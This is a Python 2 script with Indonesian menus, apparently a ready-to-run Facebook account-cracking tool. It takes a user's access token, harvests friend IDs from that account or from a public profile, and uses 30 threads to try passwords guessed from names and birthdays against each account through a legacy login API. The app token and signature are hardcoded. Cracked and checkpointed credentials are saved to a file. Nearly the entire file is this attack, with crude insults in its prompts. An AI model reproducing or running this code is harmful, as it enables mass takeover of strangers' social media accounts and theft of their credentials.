#!/usr/bin/python2
#-*-coding:utf-8-*-
#Coded by AangSans-Xyz

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
from datetime import datetime
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 kontol.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print 'Selamat tinggal sayang :)'
    os.sys.Exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)


logo ="""\033[1;91m
  /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$$
 /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$|__  $$__/
| $$  \__/| $$  \ $$| $$  \ $$| $$  \ $$   | $$   
| $$      | $$$$$$$/| $$  | $$| $$  | $$   | $$   
| $$      | $$__  $$| $$  | $$| $$  | $$   | $$   
| $$    $$| $$  \ $$| $$  | $$| $$  | $$   | $$   
|  $$$$$$/| $$  | $$|  $$$$$$/|  $$$$$$/   | $$   
 \______/ |__/  |__/ \______/  \______/    |__/   
\033[0m"""

def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\rSabar pantek!!' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []

def masuk():
    os.system('clear')
    print logo
    print '                                     '
    print '[01.] Login Using Token'
    print '[00.] Exit/Keluar'
    print '                                      '
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('Pilih > ')
    if msuk == '':
        print '\nSalah Tod!!'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\nSalah Tod!!'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('Token > ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\nBerhasil Masuk✓')
        menu()
    except KeyError:
        print 'Token Salah Goblok!!'
        time.sleep(1)
        masuk()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print 'Token Invalid/Kadaluarsa'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print 'Tidak ada koneksi'
        keluar()

    os.system('clear')
    print logo
    print 42 * '='
    print 'Nama :' + nama
    print 'ID   : ' + id
    print 42 * '='
    print '[1] Start Crack/Mulai Crack'
    print '[0] Exit/Keluar'
    pilih()


def pilih():
    unikers = raw_input('\nPilih > ')
    if unikers == '':
        print 'Salah Tod!!'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '0':
        os.system('clear')
        jalan('Menghapus Token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print 'Salah Tod!!'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print 'Token Invalid/Kadaluarsa'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 42 * '='
    print '[1] Crack From Friends/Teman'
    print '[2] Crack From Publik'
    print '[0] Back/Kembali'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\nPilih > ')
    if peak == '':
        print 'Salah Tod!!'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 42 * '='
            jalan('[Sedang Mengambil ID]')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            print 42 * '='
            idt = raw_input('Masukan ID Publik > ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print 'Nama > ' + op['name']
            except KeyError:
                print 'ID Tidak Ada'
                raw_input('\nTekan Enter Untuk Kembali')
                super()

            jalan('Sedang Mengambil ID')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '0':
            menu()
        else:
            print 'Salah'
            pilih_super()
        print 'Total ID > ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\rCrack' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print '\tUntuk Berhenti Tekan CTRL + z'
    print '\tJika Tidak Ada Hasil, Gunakan Mode Pesawat [5 Detik] Saja'
    print 42 * '='

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '[SUKSES BRO]'
                print '[Nama] -> ' + b['name']
                print '[ID] -> ' + user
                print '[Sand]i -> ' + pass1 + '\n'
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[GAGAL NJING]'
                print '[Nama] -> ' + b['name']
                print '[ID] -> ' + user
                print '[Sandi] -> ' + pass1 + '\n'
                cek = open('out/super_cp.txt', 'a')
                cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print 'SUKSES BRO'
                    print 'Nama > ' + b['name']
                    print 'ID > ' + user
                    print 'Sandi > ' + pass2 + '\n'
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print 'GAGAL NJING'
                    print 'Nama > ' + b['name']
                    print 'ID > ' + user
                    print 'Sandi > ' + pass2 + '\n'
                    cek = open('out/super_cp.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '[SUKSES BRO]'
                        print '[Nama] -> ' + b['name']
                        print '[ID] -> ' + user
                        print '[Sandi] -> ' + pass3 + '\n'
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '[GAGAL NJING]'
                        print '[Nama] -> ' + b['name']
                        print '[ID] -> ' + user
                        print '[Sandi] -> ' + pass3 + '\n'
                        cek = open('out/super_cp.txt', 'a')
                        cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = 'Kontol'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '[SUKSES BRO]'
                            print 'Nama] -> ' + b['name']
                            print '[ID] -> ' + user
                            print '[Sandi] +> ' + pass4 + '\n'
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '[GAGAL NJING]'
                            print '[Nama] ->n' + b['name']
                            print '[ID] -> ' + user
                            print '[Sandi] -> ' + pass4 + '\n'
                            cek = open('out/super_cp.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            birthday = b['birthday']
                            pass5 = birthday.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '[SUKSES BRO]'
                                print '[Nama] -> ' + b['name']
                                print '[ID] -> ' + user
                                print '[Sandi] -> ' + pass5 + '\n'
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '[GAGAL NJING]'
                                print '[Nama] -> ' + b['name']
                                print '[ID] -> ' + user
                                print '[Sandi] -> ' + pass5 + '\n'
                                cek = open('out/super_cp.txt', 'a')
                                cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'AangSans-Xyz'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '[SUKSES BRO]'
                                    print '[Nama] -> ' + b['name']
                                    print '[ID] -> ' + user
                                    print '[Sandi] -> ' + pass6 + '\n'
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '[GAGAL NJING]'
                                    print '[Nama] -> ' + b['name']
                                    print 'ID -> ' + user
                                    print 'Sandi ->!' + pass6 + '\n'
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 'Crack Selesai...'
    print 'OK > ' + str(len(oks))
    print 'CP > ' + str(len(cekpoint))
    print 'CP File tersimpan out/super_cp.txt'
    raw_input('\nTEKAN ENTER UNTUK KEMBALI')
    super()


if __name__ == '__main__':
    menu()
    masuk()